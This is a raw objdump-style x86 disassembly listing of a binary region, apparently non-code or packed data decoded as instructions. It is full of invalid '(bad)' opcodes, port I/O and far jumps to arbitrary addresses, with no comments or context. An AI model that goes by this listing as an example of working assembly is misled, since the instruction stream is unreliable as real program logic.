  412c6d:	rcr    BYTE PTR [edx+0x27186c8c],1
  412c73:	add    DWORD PTR [ebx],eax
  412c75:	cmp    ecx,edx
  412c77:	mov    al,ds:0x14074937
  412c7c:	clc    
  412c7d:	mov    ebx,0xd0459a08
  412c82:	or     dh,BYTE PTR [edx]
  412c84:	mov    dl,0xd7
  412c86:	sbb    esp,edi
  412c88:	(bad)  
  412c89:	jecxz  0x412d00
  412c8b:	mov    esi,0xad60b65
  412c90:	shr    bl,1
  412c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c93:	or     DWORD PTR cs:[esi+0x5a],ebx
  412c97:	aad    0x19
  412c99:	shr    DWORD PTR [esi-0x3a],1
  412c9c:	fimul  WORD PTR [ebx]
  412c9e:	pop    ebx
  412c9f:	push   es
  412ca0:	mov    bl,0x53
  412ca2:	inc    edx
  412ca3:	xor    eax,edi
  412ca5:	iret   
  412ca6:	gs push edi
  412ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ca9:	jmp    0x412cb8
  412cab:	out    0x98,eax
  412cad:	nop
  412cae:	(bad)  
  412caf:	mov    al,ds:0xb7159854
  412cb4:	ficomp WORD PTR [ebx-0x53]
  412cb7:	out    0x3e,al
  412cb9:	lock call 0x7264:0x817fac78
  412cc1:	add    al,0x14
  412cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc4:	gs mov al,0x5b
  412cc7:	retf   
  412cc8:	sbb    ah,BYTE PTR [edx]
  412cca:	dec    esi
  412ccb:	inc    ebp
  412ccc:	mov    dl,0x43
  412cce:	xor    BYTE PTR ds:0x4255790c,al
  412cd4:	test   eax,0x1256e019
  412cd9:	add    dh,BYTE PTR [ebp+ebp*2-0x45]
  412cdd:	scas   al,BYTE PTR es:[edi]
  412cde:	xchg   esp,eax
  412cdf:	aam    0x35
  412ce1:	in     eax,dx
  412ce2:	int3   
  412ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce4:	pop    eax
  412ce5:	sub    ecx,DWORD PTR [edi]
  412ce7:	outs   dx,DWORD PTR ds:[esi]
  412ce8:	(bad)  
  412ce9:	xchg   ecx,eax
  412cea:	out    dx,eax
  412ceb:	push   eax
  412cec:	pop    ebx
  412ced:	xlat   BYTE PTR ds:[ebx]
  412cee:	and    cl,BYTE PTR [edi-0x43]
  412cf1:	outs   dx,BYTE PTR gs:[esi]
  412cf3:	out    0x26,eax
  412cf5:	retf   
  412cf6:	pop    edi
  412cf7:	sbb    DWORD PTR [ebx+0x5fa24416],esp
  412cfd:	add    DWORD PTR [ebx],edx
  412cff:	adc    eax,0xbbd68b02
  412d04:	iret   
  412d05:	repz call 0xf280:0x2312c8d8
  412d0d:	xchg   ebp,eax
  412d0e:	mov    eax,ds:0xa44ac172
  412d14:	xchg   DWORD PTR [ebp-0x65],esp
  412d17:	xor    eax,0x8b6c9f1d
  412d1c:	arpl   WORD PTR [edx],bx
  412d1e:	cli    
  412d1f:	int3   
  412d20:	test   al,0xb
  412d22:	cli    
  412d23:	mov    edi,0x70d27340
  412d28:	xchg   ebx,eax
  412d29:	loop   0x412cc5
  412d2b:	dec    edi
  412d2c:	xor    eax,0x8d0b6309
  412d31:	xor    ebx,0x2bddc9a7
  412d37:	shr    DWORD PTR [esi-0x4d530fbd],1
  412d3d:	pop    ebp
  412d3e:	jge    0x412d46
  412d40:	shr    eax,1
  412d42:	loopne 0x412dc2
  412d44:	(bad)  
  412d45:	or     ecx,DWORD PTR [esi]
  412d47:	scas   al,BYTE PTR es:[edi]
  412d48:	clc    
  412d49:	pop    ecx
  412d4a:	maskmovq mm0,(bad)
  412d4b:	test   DWORD PTR [edi-0x4aea65df],0xb4788f32
  412d55:	cmp    DWORD PTR [esi-0x5a],edx
  412d58:	mov    edi,0x64c585a8
  412d5d:	and    BYTE PTR [edi-0x65b90599],bl
  412d63:	sti    
  412d64:	jo     0x412ce6
  412d66:	or     eax,0xcc7f4b
  412d6b:	stos   DWORD PTR es:[edi],eax
  412d6c:	(bad)  
  412d6d:	test   BYTE PTR [eax+0x2e],0xa2
  412d71:	sbb    eax,0xe6486d9a
  412d76:	adc    al,0xf0
  412d78:	lock test BYTE PTR [ebx-0x59],ch
  412d7c:	rcr    BYTE PTR [eax],0x1f
  412d7f:	xor    BYTE PTR [eax-0x5bf42d10],al
  412d85:	(bad)  
  412d86:	mov    BYTE PTR [edx],dh
  412d88:	mov    dl,0x28
  412d8a:	adc    ecx,DWORD PTR [ebx+eiz*8+0x42a7a5cf]
  412d91:	dec    esp
  412d92:	das    
  412d93:	push   0xffffff9d
  412d95:	ins    DWORD PTR es:[edi],dx
  412d96:	(bad)  
  412d97:	push   edx
  412d98:	mov    dl,0xa5
  412d9a:	aad    0x76
  412d9c:	inc    ebp
  412d9d:	sub    al,0x8d
  412d9f:	cmp    al,0x36
  412da1:	or     esp,DWORD PTR [ecx+0x24a2a47a]
  412da7:	cmp    ecx,edx
  412da9:	out    dx,al
  412daa:	call   0x72e7:0xc392c78b
  412db1:	out    0xc9,al
  412db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412db4:	mov    edx,0x45302be1
  412db9:	arpl   WORD PTR [esi+0x72],si
  412dbc:	mov    dl,0x66
  412dbe:	add    esp,ebx
  412dc0:	shl    BYTE PTR [edi+0xbb0f52e],cl
  412dc6:	das    
  412dc7:	xor    ebp,DWORD PTR [edx]
  412dc9:	pop    es
  412dca:	int    0xe2
  412dcc:	push   esp
  412dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dce:	call   0xec8f:0xd3a9c1fd
  412dd5:	loopne 0x412e43
  412dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd8:	das    
  412dd9:	sub    ebx,ebx
  412ddb:	sbb    al,0x39
  412ddd:	xlat   BYTE PTR ds:[ebx]
  412dde:	push   esp
  412ddf:	fs mov bl,0x47
  412de2:	cdq    
  412de3:	retf   
  412de4:	adc    bl,bl
  412de6:	mov    edi,0xa60f82ff
  412deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dec:	sub    eax,0x46022427
  412df1:	shl    DWORD PTR [eax+0xa78b51f],cl
  412df7:	popa   
  412df8:	sbb    BYTE PTR gs:[edi],bl
  412dfb:	shl    BYTE PTR [edx],1
  412dfd:	test   DWORD PTR [ebx+0x6],0xbcc90bf6
  412e04:	xor    ebp,DWORD PTR [edx]
  412e06:	mov    BYTE PTR ds:0x239ae0eb,al
  412e0c:	popa   
  412e0d:	out    dx,al
  412e0e:	push   ecx
  412e0f:	xor    BYTE PTR [ebx+0x41],0x78
  412e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e14:	mov    cl,0xbd
  412e16:	out    0x47,al
  412e18:	daa    
  412e19:	les    ebp,FWORD PTR [ebp-0x16]
  412e1c:	mov    esp,0xebcd3787
  412e21:	imul   ebp,DWORD PTR [ebx+0x18],0xffffff96
  412e25:	inc    esp
  412e26:	hlt    
  412e27:	mov    edx,0xae21d4bc
  412e2c:	mov    DWORD PTR [ebx-0x6c],edi
  412e2f:	outs   dx,DWORD PTR ds:[esi]
  412e30:	mov    dl,0x16
  412e32:	inc    edi
  412e33:	test   BYTE PTR [ebx-0xdf6572],al
  412e39:	jmp    0xa7a8:0xb958c086
  412e40:	test   BYTE PTR [edx],al
  412e42:	push   esp
  412e43:	pop    eax
  412e44:	(bad)  
  412e45:	pop    esp
  412e46:	aas    
  412e47:	std    
  412e48:	mov    ch,0x3f
  412e4a:	lods   eax,DWORD PTR ds:[esi]
  412e4b:	fisttp WORD PTR [ecx+0x4bf44a8a]
  412e51:	push   eax
  412e52:	xor    BYTE PTR [edi-0x3adcf7a4],ah
  412e58:	lock sbb eax,0x15aac70e
  412e5e:	mov    cl,0x9f
  412e60:	mov    al,ds:0x10a652dc
  412e65:	and    eax,0x59d1fa9e
  412e6a:	sub    eax,0x9a652047
  412e6f:	fmul   QWORD PTR [edi-0x40]
  412e72:	rcr    edi,1
  412e74:	into   
  412e75:	out    dx,al
  412e76:	push   0xffffffa7
  412e78:	repz mov dl,0xcb
  412e7b:	xchg   ebx,eax
  412e7c:	cli    
  412e7d:	sub    dl,BYTE PTR [edx+ecx*1]
  412e80:	mov    dl,0xa7
  412e82:	jne    0x412e9e
  412e84:	sbb    esp,DWORD PTR [eax+0x10]
  412e87:	shl    dh,1
  412e89:	add    al,0xf9
  412e8b:	push   esp
  412e8c:	call   edx
  412e8e:	cmp    al,bl
  412e90:	call   0xb3c8:0xa571b824
  412e97:	nop
  412e98:	mov    dl,0xd1
  412e9a:	inc    edi
  412e9b:	sub    eax,0xa7763baa
  412ea0:	mov    cl,BYTE PTR [ecx+0x769ca223]
  412ea6:	pop    ss
  412ea7:	or     edi,DWORD PTR [ebp+0x46a16bb4]
  412ead:	imul   esp,esp,0xffffffb4
  412eb0:	jns    0x412e8b
  412eb2:	sti    
  412eb3:	add    DWORD PTR [edi],0xaa7b842
  412eb9:	push   esi
  412eba:	mov    ds:0x9ad6e187,al
  412ebf:	or     cl,BYTE PTR [edi]
  412ec1:	enter  0xe0c5,0x2
  412ec5:	dec    ebp
  412ec6:	ins    BYTE PTR es:[edi],dx
  412ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ec8:	xchg   BYTE PTR [eax+ebx*2+0x4b32de3a],cl
  412ecf:	push   cs
  412ed0:	mov    bh,0xfa
  412ed2:	sbb    BYTE PTR [edx-0x7ee58218],cl
  412ed8:	out    0x25,eax
  412eda:	dec    edi
  412edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412edc:	jno    0x412f3a
  412ede:	adc    eax,0xa3925b33
  412ee3:	mov    eax,ds:0xc95f81b5
  412ee8:	in     al,dx
  412ee9:	push   eax
  412eea:	pop    ebx
  412eeb:	push   0x1baa9baa
  412ef0:	mov    cl,0x8
  412ef2:	ss mov ch,0x2b
  412ef5:	sar    DWORD PTR [esi+esi*2],1
  412ef8:	sbb    cl,BYTE PTR [esi+0x2ab2d5da]
  412efe:	inc    edx
  412eff:	retfw  0x1cc3
  412f03:	das    
  412f04:	or     BYTE PTR [ebx],cl
  412f06:	sub    DWORD PTR [ebx],0x7942957
  412f0c:	fist   WORD PTR [edi-0x66]
  412f0f:	popa   
  412f10:	stos   BYTE PTR es:[edi],al
  412f11:	mov    bh,0x44
  412f13:	stos   DWORD PTR es:[edi],eax
  412f14:	out    0x9a,eax
  412f16:	pop    ecx
  412f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f18:	test   eax,0x8b7080ae
  412f1d:	xchg   ebp,eax
  412f1e:	lock xchg ebp,eax
  412f20:	mov    dl,0x3f
  412f22:	sti    
  412f23:	outs   dx,BYTE PTR ds:[esi]
  412f24:	shl    esp,1
  412f26:	xor    ah,BYTE PTR [ebp+0x49860b87]
  412f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f2d:	jge    0x412edc
  412f2f:	pop    ss
  412f30:	inc    esp
  412f31:	rcr    DWORD PTR [edx-0x40b7d0da],cl
  412f37:	fsubr  st(4),st
  412f39:	ins    DWORD PTR es:[edi],dx
  412f3a:	stc    
  412f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f3c:	iret   
  412f3d:	aas    
  412f3e:	or     DWORD PTR [ecx+0x2b],0x4d
  412f42:	xsaveopt [edx-0x7a00bc89]
  412f49:	(bad)  
  412f4a:	cmp    dl,cl
  412f4c:	pushf  
  412f4d:	or     esi,DWORD PTR [edi+0x27e1510b]
  412f53:	sbb    eax,0x6322408a
  412f58:	mov    dl,0xe4
  412f5a:	bound  ebx,QWORD PTR [eax+0x5b]
  412f5d:	or     BYTE PTR ds:0x250ba5f8,dh
  412f63:	shl    BYTE PTR [edx+0x292529a0],cl
  412f69:	push   ss
  412f6a:	out    dx,eax
  412f6b:	loope  0x412f1e
  412f6d:	bnd jne 0x412f2c
  412f70:	(bad)  
  412f71:	inc    edi
  412f72:	pop    ebx
  412f73:	pop    edi
  412f74:	dec    eax
  412f75:	lock jg 0x412f1e
  412f78:	retf   
  412f79:	call   0xd834865d
  412f7e:	dec    ecx
  412f7f:	dec    edx
  412f80:	sbb    eax,0x2e46144b
  412f85:	sahf   
  412f86:	xchg   BYTE PTR [edi+0x34],cl
  412f89:	stc    
  412f8a:	sbb    al,BYTE PTR [edx+0x382c4a96]
  412f90:	cmp    ecx,DWORD PTR [eax]
  412f92:	mov    ah,bh
  412f94:	and    WORD PTR [ebx+eiz*4+0x33],ax
  412f99:	lods   al,BYTE PTR ds:[esi]
  412f9a:	sub    eax,0x9a4f5457
  412f9f:	dec    ecx
  412fa0:	retf   0x88b5
  412fa3:	cli    
  412fa4:	and    al,0xff
  412fa6:	jmp    DWORD PTR [edi-0x2e44e32d]
  412fac:	sub    DWORD PTR [eax],esp
  412fae:	dec    esi
  412faf:	arpl   WORD PTR [edx+0x639f87a],si
  412fb5:	not    DWORD PTR [si+0x22]
  412fb9:	or     al,0x70
  412fbb:	and    BYTE PTR [esi+eax*8+0x11],ch
  412fbf:	jbe    0x413039
  412fc1:	push   ecx
  412fc2:	mov    eax,0x2af3d87b
  412fc7:	push   ecx
  412fc8:	jmp    0xb27ea69e
  412fcd:	stc    
  412fce:	cwde   
  412fcf:	sub    al,0x37
  412fd1:	adc    dl,BYTE PTR ds:0x4e4db234
  412fd7:	out    dx,eax
  412fd8:	addr16 mov ebx,0x4c9db80
  412fde:	jl     0x413016
  412fe0:	test   DWORD PTR [esi-0x26],eax
  412fe3:	push   0xffffffc5
  412fe5:	sub    BYTE PTR ds:0x6f1db066,ch
  412feb:	push   edi
  412fec:	pop    ebp
  412fed:	lds    ecx,FWORD PTR ds:0x4de9fee7
  412ff3:	push   edi
  412ff4:	or     ecx,DWORD PTR [ebx]
  412ff6:	push   0x255713a
  412ffb:	jae    0x412fd3
  412ffd:	add    bl,BYTE PTR [ebp+0x70b18f04]
  413003:	popa   
  413004:	imul   ecx,DWORD PTR [edx],0x5a
  413007:	lods   eax,DWORD PTR ds:[esi]
  413008:	jmp    0xe3eb:0xd09d4a37
  41300f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413010:	push   0xffffff92
  413012:	cmp    dh,BYTE PTR [esi-0x42334a9]
  413018:	mov    dl,0x3e
  41301a:	outs   dx,BYTE PTR ds:[esi]
  41301b:	and    BYTE PTR [ecx],bl
  41301d:	ret    
  41301e:	or     cl,BYTE PTR [ebx]
  413020:	pop    edx
  413021:	or     edi,DWORD PTR [edi-0xbfb1e54]
  413027:	adc    DWORD PTR [edi],0x384884e9
  41302d:	or     BYTE PTR [edx-0x3e],bl
  413030:	aad    0x18
  413032:	xlat   BYTE PTR ds:[ebx]
  413033:	dec    edi
  413034:	je     0x4130b0
  413036:	ins    DWORD PTR es:[edi],dx
  413037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413038:	psraw  mm1,QWORD PTR [edi]
  41303b:	(bad)  
  41303c:	mov    BYTE PTR [ecx-0x76],dh
  41303f:	push   esi
  413040:	mov    dl,0x2a
  413042:	or     DWORD PTR [ecx-0x337943d0],ecx
  413048:	repnz or ebx,DWORD PTR [edi-0x7d14ca39]
  41304f:	outs   dx,DWORD PTR ds:[esi]
  413050:	(bad)  
  413051:	int    0x9a
  413053:	test   eax,0x7b6fd5b9
  413058:	inc    ecx
  413059:	mov    dl,0x36
  41305b:	lods   al,BYTE PTR ds:[esi]
  41305c:	push   es
  41305d:	inc    esi
  41305e:	adc    bh,bh
  413060:	mov    dl,0x36
  413062:	cmp    DWORD PTR [edi-0x6a],esi
  413065:	out    dx,eax
  413066:	cdq    
  413067:	(bad)  
  413068:	xlat   BYTE PTR ds:[ebx]
  413069:	popa   
  41306a:	sbb    DWORD PTR [edi+0x6cfbaadc],eax
  413070:	jb     0x413079
  413072:	pop    ebx
  413073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413074:	cmp    ah,bh
  413076:	xor    DWORD PTR [edi],0xd00278a
  41307c:	mov    dl,0xfe
  41307e:	rcl    BYTE PTR [esp+eiz*4+0x28],1
  413082:	cwde   
  413083:	pusha  
  413084:	cmp    al,0xf7
  413086:	cmp    BYTE PTR [esp+eax*2-0x21bbce5b],ah
  41308d:	xchg   edi,eax
  41308e:	dec    edx
  41308f:	not    esi
  413091:	jp     0x41302e
  413093:	inc    ebx
  413094:	call   0x6b06:0xa9a5b550
  41309b:	cmp    BYTE PTR [edx+0x40a72e09],dl
  4130a1:	out    0x92,al
  4130a3:	push   edi
  4130a4:	cdq    
  4130a5:	adc    DWORD PTR [ebp+edx*4-0x4e],ebp
  4130a9:	mov    ebx,0xc29e7827
  4130ae:	sbb    al,0x6
  4130b0:	es stc 
  4130b2:	shl    BYTE PTR [eax-0x6207700e],cl
  4130b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130b9:	cmp    ah,ah
  4130bb:	push   0x2
  4130bd:	jle    0x4130d8
  4130bf:	les    ebx,FWORD PTR [esi-0x4f212f10]
  4130c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c6:	xor    ebp,DWORD PTR [ebx]
  4130c8:	pop    ecx
  4130c9:	imul   eax,DWORD PTR [ebx-0x75f4c8e0],0x27
  4130d0:	cmp    eax,0xb7607cae
  4130d5:	push   eax
  4130d6:	out    0xdf,eax
  4130d8:	lods   eax,DWORD PTR ds:[esi]
  4130d9:	cdq    
  4130da:	ins    BYTE PTR es:[edi],dx
  4130db:	push   cs
  4130dc:	xor    edx,DWORD PTR [edi]
  4130de:	mov    eax,DWORD PTR [edi+0x5a5682f4]
  4130e4:	icebp  
  4130e5:	je     0x413164
  4130e7:	aam    0xe8
  4130e9:	or     al,0x1d
  4130eb:	add    BYTE PTR [edx],ah
  4130ed:	(bad)  [esi]
  4130ef:	xchg   esp,eax
  4130f0:	pop    edx
  4130f1:	dec    edi
  4130f2:	dec    edx
  4130f3:	cmp    al,0x8e
  4130f5:	dec    edx
  4130f6:	call   0x60db:0x5cb4cf74
  4130fd:	adc    DWORD PTR [edi-0x59],0xfffffff8
  413101:	mov    dh,0xb9
  413103:	xor    eax,0xb1434333
  413108:	shl    BYTE PTR [edx+0xb6dbea3],0xf8
  41310f:	fwait
  413110:	mov    al,0x13
  413112:	cdq    
  413113:	unpcklps xmm5,XMMWORD PTR cs:[ecx+ecx*4-0x5e]
  413119:	dec    edx
  41311a:	popa   
  41311b:	neg    cl
  41311d:	jmp    0x1062:0x65b44309
  413124:	mov    dl,0xe1
  413126:	ror    bl,cl
  413128:	push   ecx
  413129:	jbe    0x41312e
  41312b:	cld    
  41312c:	dec    esp
  41312d:	or     eax,eax
  41312f:	dec    ebx
  413130:	mov    esp,0xf3ab3301
  413135:	or     eax,0xf68579a
  41313a:	imul   ebx,DWORD PTR [eax],0xa73da1d4
  413140:	pop    es
  413141:	xchg   ecx,eax
  413142:	push   ds
  413143:	fmul   QWORD PTR [ebp+0x5f]
  413146:	rol    DWORD PTR [edx+0x2784d2b2],1
  41314c:	mov    DWORD PTR [edi+0xb3e7cd6],ebx
  413152:	(bad)  
  413154:	shl    DWORD PTR [edx+0x68],0x60
  413158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413159:	push   edi
  41315a:	loope  0x4130fc
  41315c:	mov    DWORD PTR [ebx-0x28],edx
  41315f:	daa    
  413160:	pmovmskb ebp,mm7
  413163:	sub    DWORD PTR [eax-0xb],0xdf71b09f
  41316a:	retf   
  41316b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41316c:	or     ebx,DWORD PTR [edx+ebp*1-0x1a284fa8]
  413173:	or     eax,0xbe62a4ac
  413178:	mov    dl,0x92
  41317a:	adc    bl,BYTE PTR [esi-0x588cd330]
  413180:	add    edi,eax
  413182:	aad    0xe5
  413184:	lea    esp,[edi]
  413186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413187:	hlt    
  413188:	mov    dl,0x4c
  41318a:	shl    BYTE PTR [edi+0x66],1
  41318d:	je     0x413140
  41318f:	push   0xffffffcb
  413191:	or     ebp,DWORD PTR [eax+esi*1]
  413194:	xchg   esi,eax
  413195:	push   0xffffffbf
  413197:	cli    
  413198:	test   eax,0x5ce29aa8
  41319d:	sub    BYTE PTR [eax-0x5a],0x9c
  4131a1:	inc    eax
  4131a2:	mul    DWORD PTR [edi+0x77f658d7]
  4131a8:	out    0x2a,eax
  4131aa:	or     dh,BYTE PTR [ebx]
  4131ac:	mov    dl,0xa6
  4131ae:	inc    esi
  4131af:	push   esi
  4131b0:	cmp    BYTE PTR [esp+ebx*4-0x38],bl
  4131b4:	mov    ebx,0xd70fb50a
  4131b9:	jmp    0x9a04:0xd7779f17
  4131c0:	mov    dl,0xbb
  4131c2:	cmp    eax,0x9c174e05
  4131c7:	shl    cl,0x35
  4131ca:	out    dx,eax
  4131cb:	enter  0xe2ad,0xe9
  4131cf:	addr16 jp 0x41318b
  4131d2:	mov    ds:0x996d3bc7,eax
  4131d7:	xchg   ch,bh
  4131d9:	popf   
  4131da:	mov    edi,0xc0ab670c
  4131df:	jbe    0x413166
  4131e1:	or     edi,ecx
  4131e3:	cmp    DWORD PTR [edi-0x53],ecx
  4131e6:	mov    BYTE PTR [ecx+0x95e7e1],al
  4131ec:	(bad)  
  4131ed:	inc    edx
  4131ee:	mov    ds:0x2e75f5c5,al
  4131f3:	(bad)  
  4131f4:	ficomp DWORD PTR [edx+0x4f32a74c]
  4131fa:	loopne 0x4131cb
  4131fc:	dec    esp
  4131fd:	sub    ah,dh
  4131ff:	popa   
  413200:	mov    bl,0xf6
  413202:	outs   dx,BYTE PTR ds:[esi]
  413203:	sub    BYTE PTR [esp+eax*1+0x34],bh
  413207:	mov    ds:0xa7f63476,eax
  41320c:	mov    edi,0xa37d659e
  413211:	dec    edx
  413212:	mov    ch,0x8d
  413214:	mov    bl,0xec
  413216:	xor    eax,0x42d27fdd
  41321b:	jmp    0x413297
  41321d:	cmp    bl,BYTE PTR [ecx-0x11]
  413220:	stc    
  413221:	mov    WORD PTR [ebp-0x519c5c7],ss
  413227:	dec    eax
  413228:	or     esi,DWORD PTR [esi]
  41322a:	in     al,dx
  41322b:	sub    bh,BYTE PTR [edx+edx*1-0x54eb90b6]
  413232:	mov    esp,0xb718e4d4
  413237:	mov    al,ds:0x6eff4c1b
  41323c:	pop    edi
  41323d:	call   0xbb54287f
  413242:	xchg   ebp,eax
  413243:	scas   al,BYTE PTR es:[edi]
  413244:	mov    cl,0xde
  413246:	sbb    eax,0x7cc9136b
  41324b:	adc    al,0x9f
  41324d:	mov    ebx,0xb5bd4ca
  413252:	loope  0x4132cb
  413254:	mov    ecx,0x7ba632f2
  413259:	xor    bl,BYTE PTR [edx+0x41a9d09b]
  41325f:	lock outs dx,BYTE PTR ds:[esi]
  413261:	mov    ax,ds:0xbd540a7
  413267:	inc    ebp
  413268:	sbb    bh,BYTE PTR [edx+ebp*1-0x1]
  41326c:	mov    bh,0xc0
  41326e:	cdq    
  41326f:	fistp  WORD PTR [edx+0x2011d12]
  413275:	adc    eax,0x58b2958
  41327a:	xchg   DWORD PTR [ebx],ecx
  41327c:	fst    QWORD PTR [ebx]
  41327e:	fs out 0x46,eax
  413281:	xchg   esp,eax
  413282:	fwait
  413283:	retf   0x21d3
  413286:	call   0xc92c:0xd6dfbfc3
  41328d:	scas   al,BYTE PTR es:[edi]
  41328e:	and    eax,0x5d686ea0
  413293:	leave  
  413294:	lahf   
  413295:	mov    eax,esi
  413297:	mov    ds:0x417eb19a,al
  41329c:	mov    DWORD PTR ds:0x3f23a7f2,ebp
  4132a2:	add    eax,0x52bd7785
  4132a7:	mov    ds:0x6038be92,al
  4132ac:	and    edi,ecx
  4132ae:	ins    BYTE PTR es:[edi],dx
  4132af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132b0:	sbb    eax,0x67e8fc31
  4132b5:	gs call 0xeca9:0x3f46c55f
  4132bd:	sub    dh,BYTE PTR [eax+0x3b340381]
  4132c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c4:	fldenv [esp+eax*2-0x659d872b]
  4132cb:	xchg   esi,eax
  4132cc:	cmc    
  4132cd:	cmp    al,0x85
  4132cf:	mov    al,ah
  4132d1:	sti    
  4132d2:	xchg   edx,eax
  4132d3:	pop    ds
  4132d4:	into   
  4132d5:	or     esi,DWORD PTR [esi+0x53]
  4132d8:	shl    BYTE PTR [esi-0x24],1
  4132db:	mov    ds:0x319981c9,al
  4132e0:	mov    ds:0x75b85c23,al
  4132e5:	ror    DWORD PTR [edx],cl
  4132e7:	ja     0x413269
  4132e9:	push   ss
  4132ea:	xchg   sp,ax
  4132ec:	cmp    cl,bl
  4132ee:	ja     0x413348
  4132f0:	mov    ebp,0xb28efb00
  4132f5:	inc    ecx
  4132f6:	and    ebx,DWORD PTR ds:0x548d1350
  4132fc:	(bad)  
  4132fd:	neg    DWORD PTR [ebx+0x51]
  413300:	xor    cl,BYTE PTR [ebx]
  413302:	mov    ds:0x7d62e77b,eax
  413307:	pop    es
  413308:	retf   0x22d0
  41330b:	mov    ss,WORD PTR [edx]
  41330d:	or     al,0x7b
  41330f:	mov    bh,0xa5
  413311:	popw   es
  413313:	mov    ds:0x8b850bb2,al
  413318:	out    0x40,eax
  41331a:	jmp    0x50e3dcd9
  41331f:	in     eax,0x13
  413321:	cmp    DWORD PTR [esi+0x74c03210],ecx
  413327:	mov    eax,0x8488a899
  41332c:	jp     0x413360
  41332e:	call   0x5fa4:0xb24401ca
  413335:	or     ebp,DWORD PTR [ebx+0x59c9612e]
  41333b:	mov    ah,0x65
  41333d:	sub    eax,0x5ac6a0e6
  413342:	call   0xcf1a:0x8d08f35c
  413349:	sbb    ebp,DWORD PTR ds:0x287b7ca7
  41334f:	and    BYTE PTR [edi-0x4],0x14
  413353:	sub    al,0xad
  413355:	mov    edx,DWORD PTR [ecx-0x42ba4df6]
  41335b:	sti    
  41335c:	sbb    ecx,0xffffff92
  41335f:	(bad)  
  413360:	call   0xa23ce1d
  413365:	retf   0xce1d
  413368:	test   DWORD PTR [eax-0x66],edi
  41336b:	mov    cl,BYTE PTR [ecx+0x7047b4a5]
  413371:	out    dx,eax
  413372:	mov    DWORD PTR [edi-0x5c0f70ed],esp
  413378:	jg     0x4133e1
  41337a:	(bad)  
  41337b:	pop    ds
  41337c:	mov    ebp,0xdd8331b7
  413381:	dec    edx
  413382:	stos   BYTE PTR es:[edi],al
  413383:	clc    
  413384:	lock std 
  413386:	pop    edx
  413387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413388:	or     eax,0x723dc715
  41338d:	or     ebp,DWORD PTR [edi+0x22]
  413390:	jns    0x4133c1
  413392:	mov    DWORD PTR [ecx+eax*8],edi
  413395:	cmp    eax,0xcfb54c0a
  41339a:	pushf  
  41339b:	pop    ss
  41339c:	pusha  
  41339d:	into   
  41339e:	cmp    eax,0xe81323da
  4133a3:	jmp    0xa76a6306
  4133a8:	push   esp
  4133a9:	ret    0xa471
  4133ac:	cmp    DWORD PTR [ebp-0x5b],ecx
  4133af:	(bad)  
  4133b0:	mov    esp,0xcb07f69f
  4133b5:	stos   DWORD PTR es:[edi],eax
  4133b6:	jmp    0x3524dc1b
  4133bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133bc:	and    al,0xc8
  4133be:	lods   eax,DWORD PTR ds:[esi]
  4133bf:	adc    ah,BYTE PTR [ebx-0x5a0d5c7a]
  4133c5:	hlt    
  4133c6:	retf   0xb213
  4133c9:	jo     0x413386
  4133cb:	(bad)  
  4133cc:	aad    0x6e
  4133ce:	add    esp,DWORD PTR [edi-0x17f992dd]
  4133d4:	popa   
  4133d5:	sar    DWORD PTR [edx-0x49],1
  4133d8:	push   esp
  4133d9:	clc    
  4133da:	call   0xa46b:0xcffbbd4d
  4133e1:	cwde   
  4133e2:	out    dx,al
  4133e3:	call   edx
  4133e5:	cmp    dl,ch
  4133e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133e8:	lahf   
  4133e9:	or     ch,cl
  4133eb:	jmp    0xd2b2:0xa123d7b8
  4133f2:	retf   
  4133f3:	popf   
  4133f4:	adc    eax,0x481b3ec4
  4133f9:	mov    bl,0x75
  4133fb:	(bad)  
  4133fd:	xor    DWORD PTR [edi-0x3ad84dcd],eax
  413403:	xchg   esp,eax
  413404:	cli    
  413405:	inc    edx
  413406:	iret   
  413407:	push   ebx
  413408:	mov    dl,0x92
  41340a:	dec    esp
  41340b:	pop    ds
  41340c:	rol    DWORD PTR [ebp+0xba841df],cl
  413412:	lock jae 0x4133df
  413415:	sbb    DWORD PTR [edx],ebp
  413417:	sub    eax,0xe799a28b
  41341c:	gs leave 
  41341e:	loopne 0x413433
  413420:	shr    al,cl
  413422:	cmp    edi,DWORD PTR [edi]
  413424:	scas   al,BYTE PTR es:[edi]
  413425:	inc    esp
  413426:	sub    eax,0x93cc88a6
  41342b:	push   edi
  41342c:	loope  0x4133fe
  41342e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41342f:	outs   dx,DWORD PTR ds:[esi]
  413430:	call   0x8b57cef6
  413435:	int    0x18
  413437:	sub    BYTE PTR [ecx+0xa7e043],ch
  41343d:	sub    al,0x26
  41343f:	stos   DWORD PTR es:[edi],eax
  413440:	test   bh,0x98
  413443:	je     0x4133f2
  413445:	xor    DWORD PTR [edi],ecx
  413447:	nop
  413448:	int    0xb
  41344a:	jecxz  0x4134ae
  41344c:	xor    edi,esi
